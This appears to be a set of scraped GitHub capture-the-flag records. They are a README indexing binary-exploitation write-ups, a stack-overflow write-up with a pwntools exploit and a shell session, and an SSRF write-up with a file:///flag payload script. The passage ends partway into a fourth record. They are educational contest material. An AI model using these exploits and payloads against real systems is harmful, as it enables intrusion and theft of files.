{"source": "github", "repo": "sajjadium/ctf-writeups", "file": "README.md", "url": "https://github.com/sajjadium/ctf-writeups/blob/master/README.md", "content": "# Preparing the Docker Containers\n\nIn order to run the challenge POCs without any problem, I prepared docker containers for various Ubuntu releases. The instructions for using the containers can be found [here](docker).\n\n# Writeups\n\n| CTF                        | Challenge   | Info               | Exploitation         | Links     |\n|:--------------------------:|:-----------:|--------------------|----------------------|:---------:|\n| [UTCTF 2019](ctfs/UTCTF/2019)| [babyecho](ctfs/UTCTF/2019/babyecho) | `x86_32` `NX` `Partial RELRO` `ASLR` | `GOT` `format string` `libc database` | [CTFtime](https://ctftime.org/event/757) [Writeups](https://ctftime.org/event/757/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/UTCTF/2019) |\n| [BSidesSF 2019](ctfs/BSidesSF/2019)| [slowfire](ctfs/BSidesSF/2019/slowfire) | `x86_64` `Partial RELRO` `ASLR` | `GOT` `PLT` `shellcode` `socket` `stack overflow` `syscall` | [CTFtime](https://ctftime.org/event/753) [Writeups](https://ctftime.org/event/753/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/BSidesSF/2019) |\n| [TAMUctf 2019](ctfs/TAMUctf/2019)| [pwn3](ctfs/TAMUctf/2019/pwn3) | `x86_32` `Full RELRO` `PIE` `ASLR` | `shellcode` `stack overflow` `syscall` | [CTFtime](https://ctftime.org/event/740) [Writeups](https://ctftime.org/event/740/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/TAMUctf/2019) |\n| [TAMUctf 2019](ctfs/TAMUctf/2019)| [pwn5](ctfs/TAMUctf/2019/pwn5) | `x86_32` `NX` `Partial RELRO` `ASLR` | `ret2libc` `stack overflow` | [CTFtime](https://ctftime.org/event/740) [Writeups](https://ctftime.org/event/740/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/TAMUctf/2019) |\n| [ASIS 2018 Finals](ctfs/ASIS/2018/Finals)| [asvdb](ctfs/ASIS/2018/Finals/asvdb) | `x86_64` `NX` `Canary` `Full RELRO` `ASLR` | `__free_hook` `double free` `heap` `one gadget` `smallbin` `tcache dup` `tcache poisoning` `tcache` `unsorted bin` `use after free` | [CTFtime](https://ctftime.org/event/620) [Writeups](https://ctftime.org/event/620/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Finals) |\n| [ASIS 2018 Finals](ctfs/ASIS/2018/Finals)| [inception](ctfs/ASIS/2018/Finals/inception) | `x86_64` `NX` `Partial RELRO` `ASLR` | `GOT` `ROP` `fork` `one gadget` `pipe` `return-to-csu` `stack overflow` | [CTFtime](https://ctftime.org/event/620) [Writeups](https://ctftime.org/event/620/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Finals) |\n| [SECCON 2018 Quals](ctfs/SECCON/2018/Quals)| [profile](ctfs/SECCON/2018/Quals/profile) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `C++` `GOT` `arbitrary read` `buffer overflow` `one gadget` `string` | [CTFtime](https://ctftime.org/event/683) [Writeups](https://ctftime.org/event/683/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/SECCON/2018/Quals) |\n| [SECCON 2018 Quals](ctfs/SECCON/2018/Quals)| [classic](ctfs/SECCON/2018/Quals/classic) | `x86_64` `NX` `Partial RELRO` `ASLR` | `GOT` `ROP` `one gadget` `stack overflow` `stack pivoting` | [CTFtime](https://ctftime.org/event/683) [Writeups](https://ctftime.org/event/683/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/SECCON/2018/Quals) |\n| [BSidesDelhi 2018](ctfs/BSidesDelhi/2018)| [data_bank](ctfs/BSidesDelhi/2018/data_bank) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__malloc_hook` `heap` `one gadget` `tcache poisoning` `tcache` `use after free` | [CTFtime](https://ctftime.org/event/700) [Writeups](https://ctftime.org/event/700/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/BSidesDelhi/2018) |\n| [HITCON 2018](ctfs/HITCON/2018)| [children_tcache](ctfs/HITCON/2018/children_tcache) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__malloc_hook` `double free` `heap` `off-by-one` `overlapping chunks` `poison-null-byte` `tcache dup` `tcache poisoning` `tcache` | [CTFtime](https://ctftime.org/event/669) [Writeups](https://ctftime.org/event/669/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/HITCON/2018) |\n| [Hack.lu 2018](ctfs/Hack.lu/2018)| [babyphp](ctfs/Hack.lu/2018/babyphp) | `Web` `PHP` | `assert` `code injection` `unintended behaviors` `unsanitized input` | [CTFtime](https://ctftime.org/event/699) [Writeups](https://ctftime.org/event/699/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/Hack.lu/2018) |\n| [InCTF 2018](ctfs/InCTF/2018)| [warmup](ctfs/InCTF/2018/warmup) | `arm` `arm32` `armhf` `Partial RELRO` `ASLR` | `shellcode` `stack overflow` `syscall` | [CTFtime](https://ctftime.org/event/662) [Writeups](https://ctftime.org/event/662/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/InCTF/2018) |\n| [InCTF 2018](ctfs/InCTF/2018)| [yawn](ctfs/InCTF/2018/yawn) | `x86_64` `NX` `Canary` `Full RELRO` `ASLR` | `GOT` `__malloc_hook` `fastbin dup` `heap` `off-by-one` `one gadget` | [CTFtime](https://ctftime.org/event/662) [Writeups](https://ctftime.org/event/662/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/InCTF/2018) |\n| [InCTF 2018](ctfs/InCTF/2018)| [securepad](ctfs/InCTF/2018/securepad) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__free_hook` `arbitrary free` `fastbin dup` `heap` `uninitialized var` `unsorted bin` | [CTFtime](https://ctftime.org/event/662) [Writeups](https://ctftime.org/event/662/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/InCTF/2018) |\n| [CSAW 2018 Quals](ctfs/CSAW/2018/Quals)| [alien_invasion](ctfs/CSAW/2018/Quals/alien_invasion) | `x86_64` `NX` `Canary` `Partial RELRO` `PIE` `ASLR` | `GOT` `heap` `off-by-one` `overlapping chunks` `poison-null-byte` | [CTFtime](https://ctftime.org/event/633) [Writeups](https://ctftime.org/event/633/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/CSAW/2018/Quals) |\n| [CSAW 2018 Quals](ctfs/CSAW/2018/Quals)| [bigboy](ctfs/CSAW/2018/Quals/bigboy) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `stack overflow` | [CTFtime](https://ctftime.org/event/633) [Writeups](https://ctftime.org/event/633/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/CSAW/2018/Quals) |\n| [CSAW 2018 Quals](ctfs/CSAW/2018/Quals)| [get_it](ctfs/CSAW/2018/Quals/get_it) | `x86_64` `NX` `Partial RELRO` `ASLR` | `stack overflow` | [CTFtime](https://ctftime.org/event/633) [Writeups](https://ctftime.org/event/633/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/CSAW/2018/Quals) |\n| [CSAW 2018 Quals](ctfs/CSAW/2018/Quals)| [shell_code](ctfs/CSAW/2018/Quals/shell_code) | `x86_64` `Full RELRO` `PIE` `ASLR` | `shellcode` `stack overflow` | [CTFtime](https://ctftime.org/event/633) [Writeups](https://ctftime.org/event/633/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/CSAW/2018/Quals) |\n| [WhiteHat 2018 Quals](ctfs/WhiteHat/2018/Quals)| [pwn02](ctfs/WhiteHat/2018/Quals/pwn02) | `x86_64` `NX` `Canary` `Full RELRO` `FORTIFY` `ASLR` | `glibc tcache` `heap` `off-by-one` `overlapping chunks` `poison-null-byte` | [CTFtime](https://ctftime.org/event/656) [Writeups](https://ctftime.org/event/656/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/WhiteHat/2018/Quals) |\n| [MeePwn 2018 Quals](ctfs/MeePwn/2018/Quals)| [babysandbox](ctfs/MeePwn/2018/Quals/babysandbox) | `x86_32` `NX` `Partial RELRO` `PIE` `ASLR` | `openat` `readv` `shellcode` `socket` `syscall` `writev` | [CTFtime](https://ctftime.org/event/625) [Writeups](https://ctftime.org/event/625/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/MeePwn/2018/Quals) |\n| [0CTF 2018 Finals](ctfs/0CTF/2018/Finals)| [freenote2018](ctfs/0CTF/2018/Finals/freenote2018) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__malloc_hook` `double free` `fastbin dup` `heap metadata` `heap` `overlapping chunks` | [CTFtime](https://ctftime.org/event/558) [Writeups](https://ctftime.org/event/558/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/0CTF/2018/Finals) |\n| [RCTF 2018](ctfs/RCTF/2018)| [rnote3](ctfs/RCTF/2018/rnote3) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__free_hook` `fastbin` `heap` `one gadget` `overlapping chunks` `uninitialized var` | [CTFtime](https://ctftime.org/event/624) [Writeups](https://ctftime.org/event/624/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/RCTF/2018) |\n| [RCTF 2018](ctfs/RCTF/2018)| [babyheap](ctfs/RCTF/2018/babyheap) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `PREV_IN_USE bit` `__malloc_hook` `heap` `off-by-one` `poison-null-byte` | [CTFtime](https://ctftime.org/event/624) [Writeups](https://ctftime.org/event/624/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/RCTF/2018) |\n| [RCTF 2018](ctfs/RCTF/2018)| [stringer](ctfs/RCTF/2018/stringer) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `IS_MMAPED` `__malloc_hook` `calloc` `double free` `fastbin dup` `heap` `off-by-one` | [CTFtime](https://ctftime.org/event/624) [Writeups](https://ctftime.org/event/624/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/RCTF/2018) |\n| [PlaidCTF 2018](ctfs/PlaidCTF/2018)| [shop](ctfs/PlaidCTF/2018/shop) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `buffer overflow` `heap` `one gadget` | [CTFtime](https://ctftime.org/event/617) [Writeups](https://ctftime.org/event/617/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/PlaidCTF/2018) |\n| [ASIS 2018 Quals](ctfs/ASIS/2018/Quals)| [cat](ctfs/ASIS/2018/Quals/cat) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `fastbin` `heap` | [CTFtime](https://ctftime.org/event/568) [Writeups](https://ctftime.org/event/568/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Quals) |\n| [ASIS 2018 Quals](ctfs/ASIS/2018/Quals)| [fifty_dollars](ctfs/ASIS/2018/Quals/fifty_dollars) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `double free` `fastbin` `heap` `use after free` | [CTFtime](https://ctftime.org/event/568) [Writeups](https://ctftime.org/event/568/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Quals) |\n| [ASIS 2018 Quals](ctfs/ASIS/2018/Quals)| [just_sort](ctfs/ASIS/2018/Quals/just_sort) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `heap overflow` `one gadget` | [CTFtime](https://ctftime.org/event/568) [Writeups](https://ctftime.org/event/568/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Quals) |\n| [ASIS 2018 Quals](ctfs/ASIS/2018/Quals)| [message_me](ctfs/ASIS/2018/Quals/message_me) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `__malloc_hook` `double free` `fastbins` `heap` `overlapping chunks` `use after free` | [CTFtime](https://ctftime.org/event/568) [Writeups](https://ctftime.org/event/568/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/ASIS/2018/Quals) |\n| [StarCTF 2018](ctfs/StarCTF/2018)| [babystack](ctfs/StarCTF/2018/babystack) | `x86_64` `NX` `Canary` `Full RELRO` `ASLR` | `GOT` `pthread` `stack overflow` `stack_guard` `thread local storage` | [CTFtime](https://ctftime.org/event/614/) [Writeups](https://ctftime.org/event/614//tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/StarCTF/2018) |\n| [StarCTF 2018](ctfs/StarCTF/2018)| [note](ctfs/StarCTF/2018/note) | `x86_64` `NX` `Full RELRO` `ASLR` | `GOT` `LSB` `ROP` `off-by-one` `saved rbp` `stack overflow` | [CTFtime](https://ctftime.org/event/614/) [Writeups](https://ctftime.org/event/614//tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/StarCTF/2018) |\n| [StarCTF 2018](ctfs/StarCTF/2018)| [warmup](ctfs/StarCTF/2018/warmup) | `x86_64` `NX` `Full RELRO` `ASLR` | `GOT` `one gadget` `stack overflow` | [CTFtime](https://ctftime.org/event/614/) [Writeups](https://ctftime.org/event/614//tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/StarCTF/2018) |\n| [WPICTF 2018](ctfs/WPICTF/2018)| [forker.level1](ctfs/WPICTF/2018/forker.level1) | `x86_64` `Partial RELRO` `ASLR` | `GOT` `ROP` `return-to-csu` `shellcode` `stack overflow` | [CTFtime](https://ctftime.org/event/600) [Writeups](https://ctftime.org/event/600/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/WPICTF/2018) |\n| [WPICTF 2018](ctfs/WPICTF/2018)| [forker.level2](ctfs/WPICTF/2018/forker.level2) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `fork` `socket` `stack canary` `stack cookie` `stack overflow` | [CTFtime](https://ctftime.org/event/600) [Writeups](https://ctftime.org/event/600/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/WPICTF/2018) |\n| [UIUCTF 2018](ctfs/UIUCTF/2018)| [how2heap](ctfs/UIUCTF/2018/how2heap) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `heap` `one gadget` | [CTFtime](https://ctftime.org/event/587) [Writeups](https://ctftime.org/event/587/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/UIUCTF/2018) |\n| [0CTF 2018 Quals](ctfs/0CTF/2018/Quals)| [babyheap](ctfs/0CTF/2018/Quals/babyheap) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `__malloc_hook` `double free` `fastbin dup` `heap` `off-by-one` `one gadget` `top chunk` | [CTFtime](https://ctftime.org/event/557) [Writeups](https://ctftime.org/event/557/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/0CTF/2018/Quals) |\n| [0CTF 2018 Quals](ctfs/0CTF/2018/Quals)| [babystack](ctfs/0CTF/2018/Quals/babystack) | `x86_32` `NX` `Partial RELRO` `ASLR` | `Elf_Rel` `Elf_Sym` `GOT` `PLT` `ROP` `dynstr` `dynsym` `rel_plt` `stack overflow` | [CTFtime](https://ctftime.org/event/557) [Writeups](https://ctftime.org/event/557/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/0CTF/2018/Quals) |\n| [iCTF 2018](ctfs/iCTF/2018)| [fantasticiot](ctfs/iCTF/2018/fantasticiot) | `x86_32` `NX` `Canary` `ASLR` | `attack & defense` `binary patching` `strncmp` | [CTFtime](https://ctftime.org/event/567) [Writeups](https://ctftime.org/event/567/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/iCTF/2018) |\n| [TAMUctf 2018](ctfs/TAMUctf/2018)| [pwn5](ctfs/TAMUctf/2018/pwn5) | `x86_32` `NX` `Partial RELRO` `ASLR` | `ROP` `stack overflow` `syscall` | [CTFtime](https://ctftime.org/event/559) [Writeups](https://ctftime.org/event/559/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/TAMUctf/2018) |\n| [NullconHackIM 2018](ctfs/NullconHackIM/2018)| [pwn2-box](ctfs/NullconHackIM/2018/pwn2-box) | `x86_64` `Partial RELRO` `ASLR` | `ROP` `one gadget` `shellcode` `syscall` | [CTFtime](https://ctftime.org/event/566) [Writeups](https://ctftime.org/event/566/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/NullconHackIM/2018) |\n| [Codegate 2018 Quals](ctfs/Codegate/2018/Quals)| [baskin_robins31](ctfs/Codegate/2018/Quals/baskin_robins31) | `x86_64` `NX` `Partial RELRO` `ASLR` | `GOT` `ROP` `one gadget` `stack overflow` `stack pivot` | [CTFtime](https://ctftime.org/event/542) [Writeups](https://ctftime.org/event/542/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/Codegate/2018/Quals) |\n| [Codegate 2018 Quals](ctfs/Codegate/2018/Quals)| [super_marimo](ctfs/Codegate/2018/Quals/super_marimo) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `fastbin` `heap` `one gadget` | [CTFtime](https://ctftime.org/event/542) [Writeups](https://ctftime.org/event/542/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/Codegate/2018/Quals) |\n| [0CTF 2017 Quals](ctfs/0CTF/2017/Quals)| [babyheap](ctfs/0CTF/2017/Quals/babyheap) | `x86_64` `NX` `Canary` `Full RELRO` `PIE` `ASLR` | `IS_MMAPED` `__malloc_hook` `calloc` `fastbin attack` `fastbin` `heap overflow` `one gadget` `smallbin` | [CTFtime](https://ctftime.org/event/402) [Writeups](https://ctftime.org/event/402/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/0CTF/2017/Quals) |\n| [C3CTF 2017](ctfs/C3CTF/2017)| [simplegc](ctfs/C3CTF/2017/simplegc) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `fastbin` `glibc tcache` `heap` `use after free` | [CTFtime](https://ctftime.org/event/544) [Writeups](https://ctftime.org/event/544/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/C3CTF/2017) |\n| [SECCON 2017 Quals](ctfs/SECCON/2017/Quals)| [election](ctfs/SECCON/2017/Quals/election) | `x86_64` `NX` `Canary` `Full RELRO` `ASLR` | `GOT` `__malloc_hook` `fastbin` `null byte overflow` `null byte poisoning` `off-by-one` `one gadget` | [CTFtime](https://ctftime.org/event/512) [Writeups](https://ctftime.org/event/512/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/SECCON/2017/Quals) |\n| [SECCON 2017 Quals](ctfs/SECCON/2017/Quals)| [secure_keymanager](ctfs/SECCON/2017/Quals/secure_keymanager) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `PLT` `double free` `fastbin` `format string` `heap` | [CTFtime](https://ctftime.org/event/512) [Writeups](https://ctftime.org/event/512/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/SECCON/2017/Quals) |\n| [SECCON 2017 Quals](ctfs/SECCON/2017/Quals)| [video_player](ctfs/SECCON/2017/Quals/video_player) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `GOT` `__malloc_hook` `fastbin` `heap` `one gadget` `overlapping chunks` `use after free` `virtual calls` `vtable` | [CTFtime](https://ctftime.org/event/512) [Writeups](https://ctftime.org/event/512/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/SECCON/2017/Quals) |\n| [CSAW 2017 Quals](ctfs/CSAW/2017/Quals)| [scv](ctfs/CSAW/2017/Quals/scv) | `x86_64` `NX` `Canary` `Partial RELRO` `ASLR` | `ROP` `buffer over-read` `buffer overflow` `information disclosure` `one gadget` `stack overflow` | [CTFtime](https://ctftime.org/event/488) [Writeups](https://ctftime.org/event/488/tasks/) [Archives](https://github.com/sajjadium/ctf-archives/tree/master/ctfs/CSAW/2017/Quals) |\n", "timestamp": "2025-10-21T13:36:07.577765"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/SPOaaS.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/SPOaaS.md", "content": "# SPOaaS\r\nPwn, Easy\r\n\r\n## Description\r\n\r\n> Welcome to Stack Buffer Overflow as a Service! Since modern mitigations made it more difficult to exploit vulnerabilities, we decided to offer an easy and convenient service for everyone to experience the joy of exploiting a stack-based buffer overflow. Simply enter your data and win! nc 209.250.235.77 22222\r\n\r\nA binary file was attached.\r\n\r\n## Solution\r\n\r\nLet's inspect the binary file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/SPOaaS# file stack\r\nstack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=076e706085388e7880893724f98034ce9b60bead, not stripped\r\nroot@kali:/media/sf_CTFs/36c3/SPOaaS# checksec.sh -f stack\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable  FILE\r\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols      No      0           4stack\r\n```\r\n\r\nLet's open it with Ghidra:\r\n\r\n```c\r\nundefined8 main(void)\r\n{\r\n  setvbuf(stdout,(char *)0x0,2,0);\r\n  stack();\r\n  puts(\"Thank you for using SBOaaS :)\");\r\n  return 0;\r\n}\r\n\r\nvoid stack(void)\r\n{\r\n  char acStack1352 [1352];\r\n  \r\n  puts(\r\n      \"\\n------------------------------------------------------------------\\n                             SBOaaS                             \\n------------------------------------------------------------------\\n\\nWelcome to StackBuffer Overflow as a Service\\n\\nSince modern mitigations made it more difficult to exploitvulnerabilities,\\nwe decided to offer an easy and convenient service for everyone\\ntoexperience the joy of exploiting a stack-based buffer overflow.\\nSimply enter your data andwin!\\n\"\r\n      );\r\n  printf(\"Please enter your data. Good luck!\\n> \");\r\n  gets(acStack1352);\r\n  return;\r\n}\r\n```\r\n\r\nThis is a very simple buffer overflow. We'll override the return address of `stack` and jump to:\r\n\r\n```c\r\nvoid spawn_shell(void)\r\n\r\n{\r\n  char *local_18;\r\n  undefined8 local_10;\r\n  \r\n  local_18 = \"/bin/bash\";\r\n  local_10 = 0;\r\n  execve(\"/bin/bash\",&local_18,(char **)0x0);\r\n  return;\r\n}\r\n```\r\n\r\nThe exploit:\r\n\r\n```python\r\n# Generate template using:\r\n# pwn template --host 209.250.235.77 --port 22222 ./stack\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     amd64-64-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    No canary found\r\n# NX:       NX enabled\r\n# PIE:      No PIE (0x400000)\r\n\r\nimport os\r\n\r\ndef send_payload(proc, payload):\r\n    proc.sendlineafter(\"> \", payload)\r\n\r\n\r\ndef get_overflow_offset():\r\n    # It's problematic to create a core dump on an NTFS file system,\r\n    # so reconfigure core dumps to be created elsewhere\r\n    os.system(\"echo ~/core/core_dump > /proc/sys/kernel/core_pattern\")\r\n    os.system(\"rm core.* > /dev/null\")\r\n    proc = process(exe.path)\r\n    payload = cyclic(1380, n = exe.bytes)\r\n    send_payload(proc, payload)\r\n    proc.wait()\r\n    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )\r\n    log.info(\"Overflow offset: {} ({}-byte architecture)\".format(offset, exe.bytes))\r\n    return offset\r\n\r\n\r\noverflow_offset = get_overflow_offset()\r\n\r\nlog.info(\"spawn_shell() address: {}\".format(hex(exe.symbols[\"spawn_shell\"])))\r\n\r\nio = start()\r\npayload = fit({overflow_offset: exe.symbols[\"spawn_shell\"]}, filler = 'B')\r\n\r\nsend_payload(io, payload)\r\n\r\nio.interactive()\r\n```\r\n\r\nThe output:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/SPOaaS# python exploit.py\r\n[*] '/media/sf_CTFs/36c3/SPOaaS/stack'\r\n    Arch:     amd64-64-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      No PIE (0x400000)\r\n[+] Starting local process '/media/sf_CTFs/36c3/SPOaaS/stack': pid 2446\r\n[*] Process '/media/sf_CTFs/36c3/SPOaaS/stack' stopped with exit code -11 (SIGSEGV) (pid 2446)\r\n[+] Parsing corefile...: Done\r\n[*] '/media/sf_CTFs/36c3/SPOaaS/core.2446'\r\n    Arch:      amd64-64-little\r\n    RIP:       0x40068a\r\n    RSP:       0x7fffce3b59d8\r\n    Exe:       '/media/sf_CTFs/36c3/SPOaaS/stack' (0x400000)\r\n    Fault:     0x6761616161616174\r\n[*] Overflow offset: 1352 (8-byte architecture)\r\n[*] spawn_shell() address: 0x40068b\r\n[+] Opening connection to 209.250.235.77 on port 22222: Done\r\n[*] Switching to interactive mode\r\n$ ls\r\nbin\r\nboot\r\ndev\r\netc\r\nflag.txt\r\nhome\r\nlib\r\nlib64\r\nmedia\r\nmnt\r\nopt\r\nproc\r\nroot\r\nrun\r\nsbin\r\nsrv\r\nstack\r\nsys\r\ntmp\r\nusr\r\nvar\r\n$ cat flag.txt\r\njunior-20165bcdbfebe4710bd0a1c168a5e752d999676e\r\n$\r\n```", "timestamp": "2025-10-21T13:36:17.803069"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/double.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/double.md", "content": "# double\r\nWeb, Easy\r\n\r\n## Description\r\n\r\n> Get the /flag at http://108.61.211.185/\r\n\r\n## Solution\r\n\r\nWhen accessing the site we get the following output:\r\n\r\n```python\r\nimport string\r\nimport urllib2\r\nfrom bottle import route, run, post, get, request\r\n\r\n@get('/')\r\ndef index():\r\n    with open(__file__) as f:\r\n        return '<pre>' + \"\".join({'<':'<','>':'>'}.get(c,c) for c in f.read()) + '</pre>'\r\n\r\n\r\n@post('/isup')\r\n@get('/isup')\r\ndef isup():\r\n    try:\r\n        name = request.params.get('name', None)\r\n        ip = request.environ.get('REMOTE_ADDR')\r\n        is_remote = not (ip.startswith('127') or ip.startswith('172'))\r\n\r\n        is_valid = all(x in name for x in ['http', 'kuchenblech'])\r\n        if is_remote and not is_valid:\r\n            raise Exception\r\n        result = urllib2.urlopen(name).read()\r\n        return result\r\n    except:\r\n        return 'Error'\r\n\r\nrun(host='0.0.0.0', server=\"paste\", port=8080, reloader=False)\r\n```\r\n\r\nIt looks like the root directory prints the source of the backend script. Using the `/isup` page, we can read a webpage via `urllib2.urlopen(name).read()`, assuming we comply with the preconditions:\r\n\r\n* If our IP is identified as a remote IP (i.e. it starts with `127` or `172`), we can only read URLs which contain both `http` and `kuchenblech` (note: The CTF domain was `http://kuchenblech.xyz/`).\r\n* Local IPs can read any URL.\r\n\r\n`127.*.*.*` should be familiar to everyone. Let's research `172.*.*.*` addresses:\r\n\r\n> If the 1st octet is 172 and the 2nd octet of a IPv4 address is 16–31, you have a private IP address, similar to 192.168.x.x or 10.x.x.x. These are the 3 private IP address ranges that are reserved per RFC 1918.\r\n> \r\n> ...\r\n> \r\n> If the 2nd octet of an IPv4 address starting with 172 is anything other than 16–31, it’s a publicly routable IP, just like almost any other.\r\n> ([Source](https://www.quora.com/What-is-the-significance-of-IP-addresses-starting-with-172))\r\n\r\nSo, using a proxy which starts with `172` we can bypass the `is_valid` check. But what should we send as the `name`? Sending `http://108.61.211.185/flag` didn't work, perhaps `/flag` is a local file?\r\n\r\nIt turns out `urlopen` can open local files as well, so in order to open `/flag` we need to send `file:///flag`.\r\n\r\nThe final script is:\r\n\r\n```python\r\nimport requests\r\n\r\ns = requests.Session()\r\ndef get_page(ip):\r\n    r = s.get('http://108.61.211.185/isup?name=file:///flag', proxies={'http': ip})\r\n    return r.text\r\n\r\nprint get_page(\"http://172.93.199.90:3131\")\r\n```\r\n\r\nThe flag: `junior-double_or_noth1ng`.\r\n\r\nAccording to the flag (and the challenge name), the intended solution was to make a double request:\r\n\r\n```\r\nhttp://108.61.211.185/isup?name=http://108.61.211.185/isup?kuchenblech=1%26name=file:///flag\r\n```\r\n\r\nThe `name` of the external request contains both `http` and `kuchenblech` while the internal request is performed locally and therefore does not need any validation.", "timestamp": "2025-10-21T13:36:17.983748"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/flagfriendly.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/flagfriendly.md", "content": "# flagfriendly\r\nWeb, Medium\r\n\r\n## Description\r\n\r\n> Flags for friendly Kuchenblech http://45.76.92.221:8070/\r\n\r\n```python\r\n#!/usr/bin/env python3\r\nimport requests\r\nfrom flag import flag\r\nfrom flask import Flask, request, redirect, make_response\r\n\r\napp = Flask(__name__)\r\n\r\n\r\n@app.route(\"/\", methods=[\"GET\"])\r\ndef index():\r\n    title = request.args.get(\"title\", default=\"Flags for Friendly Fellows\", type=str)\r\n    print(\"Flag cookie:\", request.cookies.get(\"flag\"))\r\n    if request.cookies.get(\"flag\") == flag:\r\n        # Make sure the filename never leaks!\r\n        path = flag\r\n    else:\r\n        path = \"static/flag\"\r\n    response = make_response(\r\n        